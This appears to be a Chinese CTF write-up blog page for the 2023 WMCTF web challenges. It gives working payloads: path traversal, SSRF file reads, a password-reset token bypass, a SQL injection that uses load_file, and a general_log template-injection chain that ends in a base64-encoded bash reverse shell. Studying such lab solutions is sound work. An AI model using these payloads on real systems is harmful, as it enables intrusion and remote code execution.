@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/2023wmctf-web\/",
+  "keywords":"[wp]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="wp">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【2023WMCTF】Web-WP">
+<meta name="twitter:title" content="【2023WMCTF】Web-WP">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/2023wmctf-web/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/2023wmctf-web/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-08-22T19:26:19">
+  
+  
+    <meta property="article:modified_time" content="2023-08-22T19:26:19">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+      <meta property="article:section" content="web">
+    
+  
+  
+    
+      <meta property="article:tag" content="wp">
+    
+      <meta property="article:tag" content="2023">
+    
+      <meta property="article:tag" content="wmctf">
+    
+      <meta property="article:tag" content="web">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/3.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/3.jpeg">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/wmctf2023.png">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/wmctf2023.png">
+
+
+    <title>【2023WMCTF】Web-WP</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/2023wmctf-web/">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/3.jpeg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      【2023WMCTF】Web-WP
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-08-22T19:26:19&#43;08:00">
+        
+  八月 22, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/ctf">ctf</a>, 
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/web">web</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#anyfileread">AnyFileRead</a></li>
+    <li><a href="#ez_java_again">ez_java_again</a></li>
+    <li><a href="#你的权限放着我来">你的权限放着我来</a></li>
+    <li><a href="#ezblog">ezblog</a></li>
+    <li><a href="#ezblog2">ezblog2</a></li>
+  </ul>
+</nav>
+
+<h1 id="anyfileread">AnyFileRead</h1>
+<pre tabindex="0"><code>/admin/../flag
+</code></pre><p>抓个包，目录穿越读flag即可</p>
+<h1 id="ez_java_again">ez_java_again</h1>
+<p>可以直接读flag</p>
+<pre tabindex="0"><code>/Imagefile?url1=file:///%2566%256c%2561%2567%23java
+</code></pre><p>是个非预期</p>
+<h1 id="你的权限放着我来">你的权限放着我来</h1>
+<p>程序运⾏会默认⽣成4个账号，其中有个账号为管理员账号( <a href="mailto:jom@roomke.com">jom@roomke.com</a>)。重置管理员账号密码才能获取
+flag。</p>
+<ol>
+<li>
+<p>注册账号，登录成功，登录成功右键查看源代码，可获取⽤户邮箱列表，其中包含管理员邮箱。</p>
+</li>
+<li>
+<p>点击忘记密码按钮，进⼊密码找回⻚⾯，填写⾃⼰的邮箱。</p>
+</li>
+<li>
+<p>邮箱收到重置密码链接，访问该链接，输⼊重置的密码，并进⾏抓包，抓到/api/change接⼝。</p>
+</li>
+<li>
+<p>token设置为空，并将邮箱更改为管理员邮箱，重放请求包即可获取flag。</p>
+</li>
+</ol>
+<h1 id="ezblog">ezblog</h1>
+<p>下载题目源码，分析</p>
+<p>36行到135行的路由，用nodejs实现了werkzeug的console，类似Flask调试模式的console，这里需要鉴权才能进入console</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822210059793.png" alt="image-20230822210059793"></p>
+<p>在<code>edit</code>这个路由里，获取传入的<code>id</code>，并做查询，<code> !/\d+/igm.test(id)</code>用于检查id是否包含一个或多个数字，那么只要有数字就行，后面还有<code>/into|outfile|dumpfile/igm.test(id)</code>，说明这里不能包含上述关键词</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822214651435.png" alt="image-20230822214651435"></p>
+<p>再看<code>getPostById</code>方法，这里是直接将<code>id</code>拼接上去</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822214825978.png" alt="image-20230822214825978"></p>
+<p>所以直接传<code>/post/1'/edit</code>就可以发现存在注入</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822215021881.png" alt="image-20230822215021881"></p>
+<p>前面有说到鉴权，注释有说<code>pin</code>会<code>console</code>出来，虽然注释不一定准，就是上面说没有sql注入（bushi</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822215418419.png" alt="image-20230822215418419"></p>
+<p>这里确实会将<code>pin</code>输出</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822215639905.png" alt="image-20230822215639905"></p>
+<p>搭建本地环境时可以发现，主程序启动的程序的日志在<code>/home/ezblog/.pm2/logs/main-out.log</code>中</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822215811130.png" alt="image-20230822215811130"></p>
+<p>题目过滤了into、outfile、dumpfile，但没过滤load_file，因此我们可以读文件拿pin：‘</p>
+<p>读的文件是</p>
+<pre tabindex="0"><code>/home/ezblog/.pm2/logs/main-out.log
+</code></pre><p>十六进制编码一下</p>
+<pre tabindex="0"><code>0x2f686f6d652f657a626c6f672f2e706d322f6c6f67732f6d61696e2d6f75742e6c6f67
+</code></pre><p>结合上面的注入，<code>payload</code>就是</p>
+<pre tabindex="0"><code>/post/-1%20union%20select%201,2,load_file(0x2f686f6d652f657a626c6f672f2e706d322f6c6f67732f6d61696e2d6f75742e6c6f67)/edit
+</code></pre><p>查看源码可以看到<code>pin</code></p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822220115392.png" alt="image-20230822220115392"></p>
+<pre tabindex="0"><code>e461aa6c-ba06-47db-b951-fb3bc85e96b8
+</code></pre><p>拿到pin后可以直接console登录，进入调试器</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822220619125.png" alt="image-20230822220619125"></p>
+<p>看代码发现python这个就是一个摆设</p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822220603449.png" alt="image-20230822220603449"></p>
+<p>但我们可以执行sql语句，有黑名单，不能用<code>into</code>,<code>outfile</code>,<code>dumpfile</code></p>
+<p><img src="https://gkjzjh146.github.io/2023wmctf-web.assets/image-20230822220513511.png" alt="image-20230822220513511"></p>
+<p>现在思路是</p>
+<ol>
+<li>
+<p>利用<code>SQL</code>的<code>general_log</code>写文件到模板</p>
+</li>
+<li>
+<p>模板注入完成RCE</p>
+<p>这里用<code>general_log</code>有个小坑，题目不带<code>mysql</code>数据库，不过我们自己创建一个即可（注意需要覆盖已有的ejs模板，不能新建ejs模板，否则会因为权限问题无法读取渲染模板）：</p>
+<pre tabindex="0"><code>CREATE DATABASE mysql;
+CREATE TABLE mysql.general_log(
+  event_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  user_host mediumtext NOT NULL,
+  thread_id int(11) NOT NULL,
+  server_id int(10) unsigned NOT NULL,
+  command_type varchar(64) NOT NULL,
+  argument mediumtext NOT NULL
+) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT=&#39;General log&#39;;
+SET GLOBAL general_log_file=&#39;/home/ezblog/views/post.ejs&#39;;
+SET GLOBAL general_log=&#39;on&#39;;
+SELECT &#34;&lt;% global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx}|base64 -d|bash&#39;); %&gt;&#34;;
+</code></pre></li>
+</ol>
+<p>反弹shell拿flag即可</p>
+<h1 id="ezblog2">ezblog2</h1>
+<ul>
+<li>
+<p>Hint：</p>
+</li>
+<li>
+<ul>
+<li>hint1: in the intended solution, you archive RCE by doing &ldquo;select &lsquo;&lt;%= process.mainModule.require(&ldquo;child_process&rdquo;).execSync(&quot;/readflag&rdquo;).toString() %&gt;&rsquo; into outfile &lsquo;/home/ezblog/views/114.ejs&rsquo;&quot; and rendering template 114, but &ldquo;into|outfile&rdquo; is not allowed in the SQL console or by SQL injection.（预期解是通过执行<code>select '&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;' into outfile '/home/ezblog/views/114.ejs'</code>并渲染114.ejs模板进行命令执行，但是<code>into|outfile</code>在SQL终端和SQL注入中不允许使用）</li>
+<li>hint2: the mariadb patch disables the &ldquo;BEGIN&rdquo;, &ldquo;CALL&rdquo;, &ldquo;EXECUTE&rdquo;, &ldquo;FUNCTION&rdquo;, &ldquo;IMMEDIATE&rdquo;, &ldquo;PREPARE&rdquo;, &ldquo;PROCEDURE&rdquo;, &ldquo;TRIGGER&rdquo;, &ldquo;TRIGGERS&rdquo; keyword, they can be used to store sql statements. You can solve this challenge without using these keywords. The patch does not introduce new vulnerability.（MariaDB禁用了BEGIN、CALL、EXECUTE、FUNCTION、IMMEDIATE、PREPARE、PROCEDURE、TRIGGER、TRIGGERS这些关键字，这些可以存储SQL语句，解出此题无需利用这些关键字）</li>
+<li>hint3: notice the &ndash;server-id=114 parameter of mysqld_safe.（关注mysqld_safe的参数&ndash;server-id=114）</li>
+</ul>
+</li>
+<li>
+<p>题目介绍：ezblog, now with more secure and less unintended（相比上一题有更多的安全限制）</p>
+</li>
+</ul>
+<pre tabindex="0"><code>diff --color -r env/docker/docker-compose.yml env2/docker/docker-compose.yml 
+5c5 
+&lt;     image: wmctf2023_ezblog
+--- 
+&gt;     image: wmctf2023_ezblog2
+diff --color -r env/src/src/app.ts env2/src/src/app.ts
+248a249,251
+&gt;     try{
+&gt;         child_process.execSync(&#34;chmod -R 444 /home/ezblog/views/*&#34;) 
+&gt;     } catch (e) { } 
+</code></pre><p>前半部分是ezblog一样，拿到pin值</p>
+<p>后面用不了<code>general_log_file</code>，用的是主从复制，师傅们tql</p>
+<p>贴出大头师傅的wp，有空再学了，摸了。。</p>
+<p><a href="https://www.yuque.com/dat0u/ctf/llicuvep2fhtx77i">https://www.yuque.com/dat0u/ctf/llicuvep2fhtx77i</a></p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/wp/">wp</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/2023/">2023</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/wmctf/">wmctf</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/web/">web</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" data-tooltip="CVE-2022-29078" aria-label="上一篇: CVE-2022-29078">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/2023wmctf-web/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/2023wmctf-web/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/2023wmctf-web/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/2023wmctf-web\/';
+        
+          this.page.identifier = '\/post\/2023wmctf-web\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+    <br>
+    
+    <div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+        <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+    </div></footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" data-tooltip="CVE-2022-29078" aria-label="上一篇: CVE-2022-29078">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/2023wmctf-web/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/2023wmctf-web/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/2023wmctf-web/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F2023wmctf-web%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F2023wmctf-web%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F2023wmctf-web%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
